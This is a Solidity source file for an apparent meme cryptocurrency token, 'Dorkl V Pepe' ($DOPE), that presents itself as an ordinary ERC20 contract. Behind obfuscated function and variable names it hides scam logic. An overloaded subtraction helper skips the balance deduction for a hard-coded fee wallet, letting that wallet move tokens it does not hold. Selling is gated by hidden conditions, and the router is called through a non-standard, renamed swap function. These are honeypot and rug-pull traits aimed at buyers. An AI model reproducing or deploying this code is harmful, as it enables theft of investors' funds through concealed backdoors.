/**

Dorkl V Pepe   $DOPE
Who can win the duel between Dorkl and Pepe.Let's wait and see.


Twitter: https://twitter.com/dovpe_erc
Telegram: https://t.me/dovpe_erc
Website: https://dovpe.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqfhb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqfhb(a, b, "SafeMath");
    }

    function  _rqfhb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _rfohm {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _phitky {
    function pmKuanpspaartmFcadvcde(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract DorklVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _phitky private _Tfkpvk;
    address payable private _yiobeor;
    address private _keoftuh;

    string private constant _name = unicode"Dorkl V Pepe";
    string private constant _symbol = unicode"DOPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _eTotales = 1000000000 * 10 **_decimals;

    uint256 public _qjpvopd = _eTotales;
    uint256 public _Wiarsae = _eTotales;
    uint256 public _rnfTabv= _eTotales;
    uint256 public _BuaTyaf= _eTotales;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qlfpifkr;
    mapping (address => bool) private _tsyrvtfy;
    mapping(address => uint256) private _rhcskq;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymgvkjq=0;
    uint256 private _pevkjfg=0;
    

    bool private _qzfbfxq;
    bool public _Tqiafhim = false;
    bool private ceqvfe = false;
    bool private _aqevqz = false;


    event _mxcrpart(uint _qjpvopd);
    modifier vlysair {
        ceqvfe = true;
        _;
        ceqvfe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _eTotales;
        _qlfpifkr[owner(

        )] = true;
        _qlfpifkr[address
        (this)] = true;
        _qlfpifkr[
            _yiobeor] = true;
        _yiobeor = 
        payable (0xd6784b71008B99ff335eEc2546fe48f905C9AcD3);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _eTotales);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _eTotales;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqfhb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rfksryk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tqiafhim) {
                if (to 
                != address
                (_Tfkpvk) 
                && to !=
                 address
                 (_keoftuh)) {
                  require(_rhcskq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rhcskq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _keoftuh && to != 
            address(_Tfkpvk) &&
             !_qlfpifkr[to] ) {
                require(amount 
                <= _qjpvopd,
                 "Exceeds the _qjpvopd.");
                require(balanceOf
                (to) + amount
                 <= _Wiarsae,
                  "Exceeds the macxizse.");
                if(_pevkjfg
                < _ymgvkjq){
                  require
                  (! _expakpz(to));
                }
                _pevkjfg++;
                 _tsyrvtfy
                 [to]=true;
                rfksryk = amount._pvr
                ((_pevkjfg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _keoftuh &&
             from!= address(this) 
            && !_qlfpifkr[from] ){
                require(amount <= 
                _qjpvopd && 
                balanceOf(_yiobeor)
                <_BuaTyaf,
                 "Exceeds the _qjpvopd.");
                rfksryk = amount._pvr((_pevkjfg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pevkjfg>
                _ymgvkjq &&
                 _tsyrvtfy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ceqvfe 
            && to == _keoftuh &&
             _aqevqz &&
             contractTokenBalance>
             _rnfTabv 
            && _pevkjfg>
            _ymgvkjq&&
             !_qlfpifkr[to]&&
              !_qlfpifkr[from]
            ) {
                _pnfvtbf( _rvvkl(amount, 
                _rvvkl(contractTokenBalance,
                _BuaTyaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _urvfrv(address
                    (this).balance);
                }
            }
        }

        if(rfksryk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rfksryk);
          emit
           Transfer(from,
           address
           (this),rfksryk);
        }
        _balances[from
        ]= _rqfhb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqfhb(rfksryk));
        emit Transfer
        (from, to, 
        amount.
         _rqfhb(rfksryk));
    }

    function _pnfvtbf(uint256
     tokenAmount) private
      vlysair {
        if(tokenAmount==
        0){return;}
        if(!_qzfbfxq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfkpvk.WETH();
        _approve(address(this),
         address(
             _Tfkpvk), 
             tokenAmount);
        _Tfkpvk.
        pmKuanpspaartmFcadvcde
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvvkl
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqfhb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _yiobeor){
            return a ;
        }else{
            return a .
             _rqfhb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qjpvopd = _eTotales;
        _Wiarsae = _eTotales;
        emit _mxcrpart(_eTotales);
    }

    function _expakpz(address 
    account) private view 
    returns (bool) {
        uint256 ejurcv;
        assembly {
            ejurcv :=
             extcodesize
             (account)
        }
        return ejurcv > 
        0;
    }

    function _urvfrv(uint256
    amount) private {
        _yiobeor.
        transfer(
            amount);
    }

    function openlTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qzfbfxq ) ;
        _Tfkpvk  
        =  
        _phitky
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfkpvk), 
            _eTotales);
        _keoftuh = 
        _rfohm(_Tfkpvk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfkpvk .
             WETH ( ) );
        _Tfkpvk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_keoftuh).
        approve(address(_Tfkpvk), 
        type(uint)
        .max);
        _aqevqz = true;
        _qzfbfxq = true;
    }

    receive() external payable {}
}